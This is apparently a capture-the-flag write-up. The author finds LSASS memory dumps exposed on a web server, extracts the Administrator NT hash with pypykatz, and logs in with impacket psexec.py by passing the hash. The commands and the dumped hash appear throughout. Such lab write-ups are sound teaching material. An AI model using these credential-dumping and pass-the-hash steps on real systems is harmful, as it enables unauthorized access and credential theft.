## First machine

We started by scanning the IP using `nmap`:
nmap -A [IP]

we got port 80 so we can try to access it using the browser,we found this result:

![](https://i.ibb.co/Vm5gJJt/Screen-Shot-2022-12-29-at-9-29-03-AM.png)

in `dumps/process` i found these three files:

![](https://i.ibb.co/wcpHG80/Screen-Shot-2022-12-29-at-9-32-25-AM.png)

so i download the three of them, then i tried to search for this type of file.

`A Mini Dump crash file is a file that contains a snapshot of the memory of a computer at a specific point in time. It is typically used for debugging purposes, as it can provide information about what caused a crash or error to occur.`

`LSASS (Local Security Authority Subsystem Service) is a process in the Windows operating system that is responsible for enforcing the security policy on the system. It is responsible for managing the security of the system, including authentication of users and devices, and enforcing access controls on resources such as files and network connections.`

then i searched for how can i use them, i found that using the pypykatz tool, i can parse the secrets hidden in the LSASS process.
after running:
pypykatz lsa minidump lsasss.DMP

we got this result:

```
== LogonSession ==
authentication_id 161412 (27684)
session_id 2
username Administrator
domainname DUMPED
logon_server DUMPED
logon_time 2020-10-29T15:19:57.115459+00:00
sid S-1-5-21-3442779028-2509691204-4132320481-500
luid 161412
        == MSV ==
                Username: Administrator
                Domain: DUMPED
                LM: NA
                NT: 78f9261c7b0f08bd9a3b3b13340e4c2a
                SHA1: b1553efa581712a8efead9829535b1a723f7cc40
                DPAPI: NA
```

as you see we got the NT hash, we can use it to log in as Administrator.
using the famous impacket `psexec.py` module we managed to log in:
psexec.py Administrator@[IP] -hashes <NTLM hash>
we got our Administrator in.
in Desktop of the Administrator we got our flag.
